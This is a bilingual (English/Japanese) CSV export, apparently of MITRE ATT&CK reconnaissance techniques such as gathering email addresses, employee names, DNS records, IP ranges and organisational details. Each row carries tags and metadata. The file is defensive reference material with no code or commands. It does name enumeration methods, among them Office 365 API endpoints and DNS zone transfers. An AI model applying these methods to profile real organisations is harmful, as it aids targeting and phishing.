Monitoring Server,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--bc76d0a4-db11-4551-9ac4-01a469cfb161,2020-10-02T14:55:43.815Z,2025-04-15T22:11:53.342Z,,,,
T1589.002,T1589,Email Addresses,メールアドレス,"Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees. Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation: Azure Active Directory Reconnaisance) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote Services](https://attack.mitre.org/techniques/T1133)).",攻撃者は標的選定時に使用可能なメールアドレスを収集する可能性がある。内部システムが存在する場合でも、組織は従業員向けの公開向けメールインフラやアドレスを保有している場合がある。 敵対者は、オンラインやその他のアクセス可能なデータセット（例：[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001) や [被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）を通じて容易に入手・公開されているため、メールアドレスを簡単に収集できる可能性があります。（引用元：HackersArise Email）（引用元：CNET Leaks）メールアドレスは、より積極的な手段（例：[アクティブスキャン](https://attack.mitre.org/techniques/T1595)）によっても列挙される可能性があります。これには、システム内の有効なユーザー名を明らかにする可能性のある認証サービスからの応答を調査・分析する手法が含まれます。(引用元: GrimBlog UsernameEnum) 例えば、攻撃者はautodiscoverやGetCredentialTypeなど、公開されている各種APIエンドポイントへのクエリを通じて、Office 365環境内のメールアドレスを列挙できる可能性がある。(引用元: GitHub Office 365 User Enumeration)(引用元: Azure Active Directory Reconnaisance) この情報の収集により、他の偵察手法（例: [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [情報フィッシング](https://attack.mitre.org/techniques/T1598)）の機会が明らかになり、運用リソースの確立が可能となる （例：[メールアカウント](https://attack.mitre.org/techniques/T1586/002)）や初期アクセス （例：[フィッシング](https://attack.mitre.org/techniques/T1566) または [外部リモートサービス](https://attack.mitre.org/techniques/T1133) 経由の [ブルートフォース](https://attack.mitre.org/techniques/T1110)）。,reconnaissance,PRE,credential_abuse,unknown,authentication_system;user_interaction;network_connectivity;email_infrastructure;cloud_control_plane;saas_in_use;logging_monitoring,specified,AD / Directory Server;Log / Monitoring Server;Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--69f897fd-12a9-4c89-ad6a-46d2f3c38262,2020-10-02T14:56:24.866Z,2025-04-15T22:26:21.953Z,,,,
T1589.003,T1589,Employee Names,従業員名,"Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures. Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",敵対者は、標的選定時に使用可能な従業員名を集める可能性があります。従業員名はメールアドレスの導出に利用されるほか、その他の偵察活動の指針や、より信憑性の高い誘引策の作成に活用されます。 敵対者は、オンラインやその他のアクセス可能なデータセット（例：[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001) や [被害者所有のウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）を通じて容易に入手・公開されているため、従業員名を簡単に収集できる可能性があります。（出典：OPM情報漏洩事件）こうした情報の収集は、他の偵察手法（例：[公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [情報フィッシング](https://attack.mitre.org/techniques/T1598)）の機会を明らかにし、運用リソース（例： [アカウント侵害](https://attack.mitre.org/techniques/T1586))、および／または初期アクセス（例：[フィッシング](https://attack.mitre.org/techniques/T1566) または [有効なアカウント](https://attack.mitre.org/techniques/T1078)) の確立につながる可能性があります。,reconnaissance,PRE,other,unknown,user_interaction;email_infrastructure,specified,Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--76551c52-b111-4884-bc47-ff3e728f0156,2020-10-02T14:57:15.906Z,2025-04-15T22:27:33.795Z,,,,
T1590,,Gather Victim Network Information,被害者ネットワーク情報の収集,"Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations. Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",攻撃者は標的選定時に活用可能な被害者ネットワーク情報を収集する。ネットワーク情報には管理データ（例：IP範囲、ドメイン名等）やトポロジー・運用に関する詳細が含まれる。 攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)や[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接的な収集行動など、様々な方法でこの情報を収集する可能性がある。 ネットワーク情報は、オンラインやその他のアクセス可能なデータセット（例：[公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）を通じて敵対者に晒される可能性もあります。（引用元：WHOIS）（引用元：DNS Dumpster）(引用: Circl Passive DNS) この情報の収集により、他の偵察手法（例: [アクティブスキャン](https://attack.mitre.org/techniques/T1595) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)) の機会が明らかになる場合があり、運用リソース（例: [インフラ取得](https://attack.mitre.org/techniques/T1583) や [インフラ侵害](https://attack.mitre.org/techniques/T1584))、および/または初期アクセス（例：[信頼関係構築](https://attack.mitre.org/techniques/T1199)）の確立につながる可能性がある。,reconnaissance,PRE,data_collection,unknown,user_interaction;network_connectivity;database_access;logging_monitoring,specified,Log / Monitoring Server,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--9d48cab2-7929-4812-ad22-f536665f0109,2020-10-02T15:45:17.628Z,2025-04-15T22:38:13.461Z,,,,
T1590.001,T1590,Domain Properties,ドメインのプロパティ,"Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers. Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office 265 Azure Domain Availability) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",攻撃者は標的選定時に活用可能な被害者ネットワークドメインに関する情報を収集する可能性がある。ドメインとその特性に関する情報には、被害者が所有するドメイン名、管理データ（例：名称、レジストラ等）、および連絡先（メールアドレス・電話番号）、事業所住所、ネームサーバーといった直接的な行動に結びつく情報など、多様な詳細が含まれる。 敵対者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595) や [情報フィッシング](https://attack.mitre.org/techniques/T1598) による直接的な収集活動など、様々な方法でこの情報を収集する可能性があります。 被害ドメインとそのプロパティに関する情報は、オンラインまたはその他のアクセス可能なデータセット（例：[WHOIS](https://attack.mitre.org/techniques/T1596/002)）を通じて敵対者に公開される可能性もあります。(引用: WHOIS)(引用: DNS Dumpster)(引用: Circl Passive DNS)サードパーティのクラウドプロバイダーを利用している場合、この情報は、Office 365 環境の GetUserRealm や autodiscover などの、一般に公開されている API エンドポイントからも公開される可能性があります。(引用: Azure Active Directory Reconnaisance)(引用: Office 265 Azure Domain Availability) この情報の収集により、他の偵察手法の機会が明らかになる可能性があります（例: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)、 [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)、または[情報フィッシング](https://attack.mitre.org/techniques/T1598)）、運用リソースの確立（例： [インフラの取得](https://attack.mitre.org/techniques/T1583) や [インフラの侵害](https://attack.mitre.org/techniques/T1584))、および／または初期アクセス（例：[フィッシング](https://attack.mitre.org/techniques/T1566)）の確立につながる可能性がある。,reconnaissance,PRE,data_collection,unknown,authentication_system;user_interaction;network_connectivity;email_infrastructure;cloud_control_plane;saas_in_use;database_access,specified,AD / Directory Server;Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--e3b168bd-fcd7-439e-9382-2e6c2f63514d,2020-10-02T15:46:24.670Z,2025-04-15T22:22:22.764Z,,,,
T1590.002,T1590,DNS,DNS,"Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. DNS MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf Twitter DNS Records) Adversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)). Adversaries may also use DNS zone transfer (DNS query type AXFR) to collect all records from a misconfigured DNS server.(Citation: Trails-DNS)(Citation: DNS-CISA)(Citation: Alexa-dns)",攻撃者は標的選定時に利用可能な被害者のDNS情報を収集する可能性がある。DNS情報には登録ネームサーバーや、標的のサブドメイン・メールサーバー・その他ホストのアドレス構成を示すレコードなど多様な詳細が含まれる。DNSのMXレコード、TXTレコード、SPFレコードからは、Office 365、G Suite、Salesforce、Zendeskなどのサードパーティ製クラウド／SaaSプロバイダーの利用状況も判明する可能性がある。(引用元: Sean Metcalf Twitter DNS Records)攻撃者は、[DNS/パッシブDNS](https://attack.mitre.org/techniques/T1596/001)を介したクエリやその他の方法など、様々な手段でこの情報を収集する可能性があります。 DNS情報は、オンラインやその他のアクセス可能なデータセット（例：[公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）を通じて敵対者に晒される可能性もあります。(引用: DNS Dumpster)(引用: Circl Passive DNS) この情報の収集は、他の形態の偵察（例: [公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)、 [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)、または[アクティブスキャン](https://attack.mitre.org/techniques/T1595)）、運用リソースの確立（例： [インフラ取得](https://attack.mitre.org/techniques/T1583) や [インフラ侵害](https://attack.mitre.org/techniques/T1584))、および／または初期アクセス（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133)）の確立につながる可能性がある。 攻撃者は、設定ミスのあるDNSサーバーから全レコードを収集するため、DNSゾーン転送（DNSクエリタイプAXFR）を利用する場合もある。（引用元: Trails-DNS）（引用元: DNS-CISA）（引用元: Alexa-dns）,reconnaissance,PRE,remote_service_abuse,unknown,network_connectivity;email_infrastructure;cloud_control_plane;saas_in_use;database_access,specified,Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--0ff59227-8aa8-4c09-bf1f-925605bd07ea,2020-10-02T15:47:10.102Z,2025-04-15T22:13:37.080Z,,,,
T1590.003,T1590,Network Trust Dependencies,ネットワーク信頼依存関係,"Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",攻撃者は、標的選定時に利用可能な被害者のネットワーク信頼関係に関する情報を収集する可能性がある。 ネットワーク信頼関係に関する情報には、接続済み（かつ権限昇格の可能性のある）ネットワークアクセスを持つ二次・三次組織／ドメイン（例：マネージドサービスプロバイダー、請負業者など）を含む多様な詳細が含まれる。攻撃者は[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接的な引き出しなど、様々な方法でこの情報を収集する可能性がある。 ネットワーク信頼関係に関する情報は、オンラインやその他のアクセス可能なデータセット（例：[公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）を通じて攻撃者に晒される可能性もあります。（引用元: Pentesting AD Forests）この情報の収集により、他の偵察手法（例: [Active Scanning](https://attack.mitre.org/techniques/T1595) や [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)）の機会が明らかになる可能性があります。また、運用リソースの確立（例: [インフラの取得](https://attack.mitre.org/techniques/T1583) や [インフラの侵害](https://attack.mitre.org/techniques/T1584))、および/または初期アクセス（例：[信頼関係](https://attack.mitre.org/techniques/T1199)）の確立につながる可能性があります。,reconnaissance,PRE,discovery_enumeration,unknown,privileged_account;user_interaction;network_connectivity;database_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--36aa137f-5166-41f8-b2f0-a4cfa1b4133e,2020-10-02T15:47:59.457Z,2025-04-15T22:53:01.571Z,,,,
T1590.004,T1590,Network Topology,ネットワークトポロジー,"Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure. Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: DNS Dumpster) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",攻撃者は標的選定時に活用可能な被害者ネットワークトポロジー情報を収集する可能性がある。ネットワークトポロジー情報には、外部向けおよび内部ネットワーク環境の物理的／論理的構成を含む多様な詳細が含まれる。ネットワーク機器（ゲートウェイ、ルーター等）やその他インフラに関する特定情報も対象となる。 攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)や[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接的な収集行動など、様々な方法でこの情報を収集する可能性がある。 ネットワークトポロジーに関する情報は、オンラインやその他のアクセス可能なデータセット（例：[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）を通じて敵対者に晒される可能性もある。(引用元: DNS Dumpster) この情報の収集により、他の偵察手法（例: [公開技術データベースの検索](https://attack.mitre.org/techniques/T1596) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）や運用リソースの確立（例: [インフラの取得](https://attack.mitre.org/techniques/T1583) や [インフラの侵害](https://attack.mitre.org/techniques/T1584))、および/または初期アクセス（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133)）の確立につながる可能性がある。,reconnaissance,PRE,remote_service_abuse,unknown,user_interaction;network_connectivity;database_access;logging_monitoring,specified,Log / Monitoring Server;Proxy / Gateway,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--34ab90a3-05f6-4259-8f21-621081fdaba5,2020-10-02T15:49:03.815Z,2025-04-15T22:52:48.199Z,,,,
T1590.005,T1590,IP Addresses,IPアドレス,"Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted. Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",敵対者は、標的化中に使用可能な被害者のIPアドレスを収集する可能性がある。 パブリック IP アドレスは、ブロック単位または連続したアドレス範囲で組織に割り当てられる場合があります。割り当てられた IP アドレスに関する情報には、使用中の IP アドレスなど、さまざまな詳細が含まれる可能性があります。IP アドレスから、組織の規模、物理的な場所、インターネットサービスプロバイダー、および/または公開されているインフラストラクチャがどこでどのようにホストされているかなど、被害者に関するその他の詳細を敵対者が導き出すことも可能です。 攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)や[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接収集など、様々な方法でこの情報を収集する可能性があります。 割り当てられたIPアドレスに関する情報は、オンラインやその他のアクセス可能なデータセット（例：[公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）を通じて敵対者に晒される可能性もあります。（引用元：WHOIS）（引用元：DNS Dumpster）(引用: Circl Passive DNS) この情報の収集により、他の偵察手法（例: [アクティブスキャン](https://attack.mitre.org/techniques/T1595) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)) の機会が明らかになる可能性があり、運用リソースの確立（例: [インフラ取得](https://attack.mitre.org/techniques/T1583) や [インフラ侵害](https://attack.mitre.org/techniques/T1584))、および／または初期アクセス（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133)）の確立につながる可能性がある。,reconnaissance,PRE,remote_service_abuse,unknown,user_interaction;network_connectivity;database_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--0dda99f0-4701-48ca-9774-8504922e92d3,2020-10-02T15:59:11.695Z,2025-04-15T22:40:30.211Z,,,,
T1590.006,T1590,Network Security Appliances,ネットワークセキュリティアプライアンス,"Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations. Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",攻撃者は、標的選定時に活用可能な被害者のネットワークセキュリティアプライアンスに関する情報を収集する可能性がある。ネットワークセキュリティアプライアンスに関する情報には、導入済みファイアウォール、コンテンツフィルタ、プロキシ／バスティオンホストの存在や詳細など、様々な詳細が含まれる。攻撃者はまた、被害者のネットワークベース侵入検知システム（NIDS）やその他の防御的サイバーセキュリティ運用に関連するアプライアンスに関する情報を標的とする場合もある。 攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)や[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接的な収集行動など、様々な方法でこの情報を収集する可能性がある。（引用元：Nmap Firewalls NIDS）ネットワークセキュリティアプライアンスに関する情報は、オンラインやその他のアクセス可能なデータセット（例：[被害者所有のウェブサイト検索](https://attack.mitre.org/techniques/T1594)）を通じて敵対者に公開される可能性もあります。 この情報の収集により、他の形態の偵察（例：[公開技術データベースの検索](https://attack.mitre.org/techniques/T1596) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）や作戦資源の確立（例： [能力開発](https://attack.mitre.org/techniques/T1587) や [能力取得](https://attack.mitre.org/techniques/T1588))、および／または初期アクセス手段（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133)）の確立につながる可能性があります。,reconnaissance,PRE,remote_service_abuse,unknown,user_interaction;network_connectivity;database_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--6c2957f9-502a-478c-b1dd-d626c0659413,2020-10-02T16:01:35.350Z,2025-04-15T22:52:16.483Z,,,,
T1591,,Gather Victim Org Information,被害組織情報の収集,"Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",敵対者は、標的選定時に利用可能な被害組織に関する情報を収集する可能性がある。 組織に関する情報には、部門名、事業運営の詳細、主要従業員の役割や責任など、様々な詳細が含まれる可能性がある。敵対者は、[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接的な引き出しなど、様々な方法でこの情報を収集する可能性がある。 組織情報は、オンラインやその他のアクセス可能なデータセット（例：[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001) や [被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）を通じて敵対者に晒される可能性もある。(引用元: ThreatPost Broadvoice Leak)(引用元: SEC EDGAR Search)この情報の収集により、他の偵察手法（例: [情報フィッシング](https://attack.mitre.org/techniques/T1598) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）の機会が明らかになり、運用リソースの確立が可能となる （例：[アカウントの確立](https://attack.mitre.org/techniques/T1585) または [アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、および／または初期アクセス （例：[フィッシング](https://attack.mitre.org/techniques/T1566) または [信頼関係構築](https://attack.mitre.org/techniques/T1199)）。,reconnaissance,PRE,other,unknown,user_interaction;cloud_control_plane,specified,Unknown,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--937e4772-8441-4e4a-8bf0-8d447d667e23,2020-10-02T16:27:02.339Z,2025-04-15T22:38:32.343Z,,,,
T1591.001,T1591,Determine Physical Locations,物理的な位置の特定,"Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",敵対者は、標的化の際に利用可能な被害者の物理的な位置情報を収集する可能性がある。 標的組織の物理的な場所に関する情報には、主要なリソースやインフラがどこに収容されているかなど、様々な詳細が含まれる可能性がある。物理的な場所は、被害者がどの法的管轄区域や当局の管轄下で活動しているかを示す場合もある。敵対者は、[情報フィッシング](https://attack.mitre.org/techniques/T1598)による直接的な引き出しなど、様々な方法でこの情報を収集する可能性がある。 標的組織の物理的所在地は、オンラインやその他のアクセス可能なデータセット（例：[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594) や [ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001)）を通じて敵対者に暴露される可能性もある。(引用元: ThreatPost Broadvoice Leak)(引用元: SEC EDGAR Search)この情報の収集により、他の偵察手法（例: [情報フィッシング](https://attack.mitre.org/techniques/T1598) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）の機会が明らかになり、作戦資源の確立につながる （例：[能力開発](https://attack.mitre.org/techniques/T1587) または [能力取得](https://attack.mitre.org/techniques/T1588)）、および／または初期アクセス （例：[フィッシング](https://attack.mitre.org/techniques/T1566) または [ハードウェア追加](https://attack.mitre.org/techniques/T1200)）。,reconnaissance,PRE,other,unknown,user_interaction,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--ed730f20-0e44-48b9-85f8-0e2adeb76867,2020-10-02T16:32:33.126Z,2025-04-15T22:16:44.365Z,,,,
